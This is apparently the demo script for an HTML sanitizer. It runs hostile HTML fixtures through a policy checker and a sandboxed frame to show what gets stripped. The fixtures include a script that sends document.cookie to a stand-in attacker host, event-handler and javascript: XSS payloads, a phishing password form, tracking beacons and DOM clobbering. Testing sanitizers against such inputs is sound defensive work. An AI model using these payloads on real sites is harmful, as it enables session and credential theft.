import manifest from "../dist/frame-manifest.js";
import { setClassAllowlist, checkTree } from "../src/policy.js";
import { parseHtmlToRaw } from "../src/adapters/dom.js";
import { createSandboxFrame } from "../src/host.js";

setClassAllowlist(manifest.classes);

const cases = [
  {
    id: "script",
    category: "Code execution",
    title: "Script and event-handler injection",
    summary: "Executable elements and inline handlers are removed while ordinary content survives.",
    html: `<div class="card stack">
  <h2 class="title" onclick="alert(document.cookie)">Account notice</h2>
  <script>fetch("https://attacker.invalid/steal?cookie=" + document.cookie)</script>
  <p onmouseover="alert(1)">Your report is ready.</p>
  <button formaction="https://attacker.invalid/submit">Continue</button>
</div>`,
  },
  {
    id: "network",
    category: "Data exfiltration",
    title: "Automatic network requests",
    summary: "Fetching elements and URL-bearing attributes are absent from the reconstructed tree; frame CSP also denies connections.",
    html: `<div class="card stack">
  <h2 class="title">Tracking payload</h2>
  <img src="https://attacker.invalid/pixel?user=123">
  <iframe src="https://attacker.invalid/collect"></iframe>
  <link rel="preload" href="https://attacker.invalid/log">
  <svg><image href="https://attacker.invalid/beacon.svg"></image></svg>
  <p class="muted">The visible explanation remains.</p>
</div>`,
  },
  {
    id: "navigation",
    category: "Navigation and phishing",
    title: "Links and credential forms",
    summary: "Links are unwrapped, forms are unwrapped, password controls are rejected, and autocomplete is forced off.",
    html: `<div class="card stack">
  <h2 class="title">Session expired</h2>
  <a href="https://attacker.invalid/login" target="_top">Sign in again</a>
  <form action="https://attacker.invalid/password" method="post">
    <label>Password <input type="password" name="password" autocomplete="current-password"></label>
    <button type="submit">Sign in</button>
  </form>
</div>`,
  },
  {
    id: "svg",
    category: "SVG execution surface",
    title: "SVG references and animation",
    summary: "Safe geometry remains, while referenced resources, animation, foreign content, and SVG links are removed.",
    html: `<svg viewBox="0 0 320 140" role="img" aria-label="Untrusted chart">
  <rect x="10" y="20" width="80" height="90" fill="#2563eb"></rect>
  <circle cx="150" cy="70" r="38" fill="rgb(22,163,74)"></circle>
  <use href="https://attacker.invalid/icons.svg#x"></use>
  <animate attributeName="x" values="0;100" dur="1s"></animate>
  <foreignObject><iframe src="https://attacker.invalid"></iframe></foreignObject>
  <a href="javascript:alert(1)"><text x="210" y="70">click</text></a>
</svg>`,
  },
  {
    id: "clobber",
    category: "DOM integrity",
    title: "DOM clobbering and style escape",
    summary: "IDs are namespaced, dangerous names and inline styles are removed, and unknown classes do not cross the policy.",
    html: `<div id="root" name="location" class="card evil-overlay"
     style="position:fixed;inset:0;z-index:999999">
  <h2 id="constructor" class="title">Overlay attempt</h2>
  <input id="__proto__" name="cookie" autofocus accesskey="x">
  <p class="muted unknown-class">The card remains contained.</p>
</div>`,
  },
  {
    id: "malformed",
    category: "Parser differentials",
    title: "Malformed and misnested markup",
    summary: "The HTML parser repairs the fragment first; the policy checks the resulting tree rather than trusting source-text patterns.",
    html: `<div class="card"><h2 class="title">Repair test
  <p>First paragraph <b>bold
  <table><div onclick="alert(1)">foster-parented text</div><tr><td>Cell
  <svg><desc><img src=x onerror="alert(2)"></desc><rect width="40" height="20">
</div>`,
  },
];

const $ = (id) => document.getElementById(id);
const list = $("cases");
let current = null;

const VOID_HTML = new Set(["area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track", "wbr"]);

function escapeText(value) {
  return String(value).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function escapeAttribute(value) {
  return escapeText(value).replace(/"/g, "&quot;");
}

// This is explanatory output only. The security-sensitive renderer consumes
// the validated tree directly and never reparses this serialization.
function serializeTree(node, depth = 0) {
  if (node.kind === "text") return escapeText(node.text);
  if (node.kind === "root") return node.children.map((child) => serializeTree(child, depth)).join("\n");
  const indent = "  ".repeat(depth);
  const attrs = node.attrs.map(([name, value]) => ` ${name}="${escapeAttribute(value)}"`).join("");
  const open = `${indent}<${node.tag}${attrs}>`;
  if (node.ns === "html" && VOID_HTML.has(node.tag)) return open;
  if (node.children.length === 0) return `${open}</${node.tag}>`;
  const onlyText = node.children.every((child) => child.kind === "text");
  if (onlyText) return `${open}${node.children.map((child) => serializeTree(child, depth + 1)).join("")}</${node.tag}>`;
  const children = node.children.map((child) => serializeTree(child, depth + 1)).join("\n");
  return `${open}\n${children}\n${indent}</${node.tag}>`;
}

const frame = createSandboxFrame({
  container: $("frame-container"),
  manifest,
  onStatus: ({ kind, detail }) => {
    if (kind === "refused") setVerdict(`Frame refused: ${detail}`, true);
  },
});

function setVerdict(text, rejected = false) {
  $("verdict").textContent = text;
  $("verdict").classList.toggle("rejected", rejected);
}

function describe(change) {
  const where = change.path ? ` at tree path ${change.path.join("/")}` : "";
  const why = change.why ? ` (${change.why})` : "";
  switch (change.kind) {
    case "removed-element": return `Removed <${change.tag}>${why}${where} — ${change.rule}`;
    case "unwrapped-element": return `Removed <${change.tag}> wrapper but kept safe children${where} — ${change.rule}`;
    case "removed-attribute": return `Removed ${change.tag}[${change.name}]${why}${where} — ${change.rule}`;
    case "rewrote-attribute": return `Rewrote ${change.tag}[${change.name}]${where} — ${change.rule}`;
    case "removed-node": return `Removed ${change.what || "unknown node"}${where} — ${change.rule}`;
    default: return JSON.stringify(change);
  }
}

async function show(entry) {
  current = entry.id;
  for (const button of list.querySelectorAll("button")) button.setAttribute("aria-current", String(button.dataset.id === entry.id));
  $("case-category").textContent = entry.category;
  $("case-title").textContent = entry.title;
  $("case-summary").textContent = entry.summary;
  $("source").textContent = entry.html;
  $("filtered-html").textContent = "";
  $("report").replaceChildren();
  setVerdict("Checking…");

  let result;
  try {
    result = checkTree(parseHtmlToRaw(entry.html, DOMParser));
  } catch (error) {
    setVerdict(`Parser failed: ${error.message}`, true);
    frame.clear();
    return;
  }
  if (result.status !== "validated") {
    setVerdict("Rejected by structural limits", true);
    $("change-count").textContent = `${result.reasons.length} reason(s)`;
    for (const reason of result.reasons) addReport(JSON.stringify(reason));
    frame.clear();
    return;
  }

  $("filtered-html").textContent = serializeTree(result.tree);
  $("change-count").textContent = `${result.changes.length} transformation(s)`;
  if (result.changes.length === 0) addReport("No unsafe constructs found.", true);
  for (const change of result.changes) addReport(describe(change));
  const rendered = await frame.render(result.tree);
  setVerdict(rendered ? "Protected and rendered" : "Frame refused output", !rendered);
}

function addReport(text, safe = false) {
  const item = document.createElement("li");
  item.textContent = text;
  if (safe) item.className = "safe";
  $("report").appendChild(item);
}

for (const entry of cases) {
  const button = document.createElement("button");
  button.type = "button";
  button.className = "case-button";
  button.dataset.id = entry.id;
  const title = document.createElement("strong");
  title.textContent = entry.title;
  const category = document.createElement("span");
  category.textContent = entry.category;
  button.append(title, category);
  button.addEventListener("click", () => { if (current !== entry.id) show(entry); });
  list.appendChild(button);
}

show(cases[0]);
